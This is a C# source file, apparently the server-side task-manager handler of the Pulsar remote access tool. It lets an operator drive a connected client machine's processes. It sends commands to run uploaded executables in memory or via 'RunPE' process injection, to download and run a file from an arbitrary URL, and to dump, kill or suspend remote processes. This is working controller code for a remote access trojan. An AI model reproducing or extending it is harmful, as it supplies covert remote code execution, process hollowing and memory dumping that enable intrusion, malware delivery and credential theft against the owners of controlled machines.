using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Pulsar.Common.Enums;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Administration.TaskManager;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Models;
using Pulsar.Common.Networking;
using Pulsar.Server.Networking;

namespace Pulsar.Server.Messages
{
    /// <summary>
    /// Handles messages for interacting with remote tasks.
    /// </summary>
    public class TaskManagerHandler : MessageProcessorBase<Process[]>, IDisposable
    {
        public delegate void ProcessActionPerformedEventHandler(object sender, ProcessAction action, bool result);
        public event ProcessActionPerformedEventHandler ProcessActionPerformed;

        public delegate void OnResponseReceivedEventHandler(object sender, DoProcessDumpResponse response);
        public event OnResponseReceivedEventHandler OnResponseReceived;

        private readonly Client _client;
        public GetProcessesResponse LastProcessesResponse { get; private set; }

        public TaskManagerHandler(Client client) : base(true)
        {
            _client = client ?? throw new ArgumentNullException(nameof(client));
        }

        public override bool CanExecute(IMessage message) => message is DoProcessResponse
                                                             || message is GetProcessesResponse
                                                             || message is DoProcessDumpResponse;

        public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoProcessResponse resp: Execute(sender, resp); break;
                case GetProcessesResponse resp: Execute(sender, resp); break;
                case DoProcessDumpResponse resp: Execute(sender, resp); break;
            }
        }

        private void Execute(ISender client, DoProcessResponse message)
        {
            // Safely invoke event on the original SynchronizationContext
            SynchronizationContext.Post(_ => ProcessActionPerformed?.Invoke(this, message.Action, message.Result), null);
        }

        private void Execute(ISender client, GetProcessesResponse message)
        {
            LastProcessesResponse = message;
            OnReport(message.Processes);
        }

        private void Execute(ISender client, DoProcessDumpResponse message)
        {
            OnResponseReceived?.Invoke(this, message);
        }

        #region Remote Process Operations

        public void StartProcess(string remotePath, bool isUpdate = false, bool executeInMemory = false, bool useRunPE = false, string runPETarget = "a", string runPECustomPath = null)
        {
            if (!File.Exists(remotePath))
            {
                MessageBox.Show($"File not found: {remotePath}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            byte[] fileBytes = File.ReadAllBytes(remotePath);
            string ext = Path.GetExtension(remotePath);

            if ((executeInMemory || useRunPE) && !string.Equals(ext, ".exe", StringComparison.OrdinalIgnoreCase))
            {
                MessageBox.Show("Only .exe files are allowed for RunPE or reflection execution.", "Invalid File Type",
                    MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            _client.Send(new DoProcessStart
            {
                FileBytes = fileBytes,
                IsUpdate = isUpdate,
                ExecuteInMemoryDotNet = executeInMemory,
                UseRunPE = useRunPE,
                RunPETarget = runPETarget,
                RunPECustomPath = runPECustomPath,
                FileExtension = ext
            });
        }

        public void StartProcessFromWeb(string url, bool isUpdate = false, bool executeInMemory = false, bool _useRunPE = false)
        {
            if (string.IsNullOrWhiteSpace(url))
            {
                MessageBox.Show("URL cannot be empty.", "Invalid URL", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            _client.Send(new DoProcessStart
            {
                DownloadUrl = url,
                IsUpdate = isUpdate,
                ExecuteInMemoryDotNet = false,
                UseRunPE = false
            });
        }

        public void SetTopMost(int pid, bool enable = true)
        {
            _client.Send(new DoSetTopMost { Pid = pid, Enable = enable });
        }

        public void RefreshProcesses()
        {
            _client.Send(new GetProcesses());
        }

        public void EndProcess(int pid)
        {
            _client.Send(new DoProcessEnd { Pid = pid });
        }

        public void DumpProcess(int pid)
        {
            _client.Send(new DoProcessDump { Pid = pid });
        }

        public void SuspendProcess(int pid)
        {
            _client.Send(new DoSuspendProcess { Pid = pid });
        }

        #endregion

        #region IDisposable

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (!disposing) return;

            // Clear event handlers to prevent memory leaks
            ProcessActionPerformed = null;
            OnResponseReceived = null;
            LastProcessesResponse = null;
        }

        #endregion
    }
}
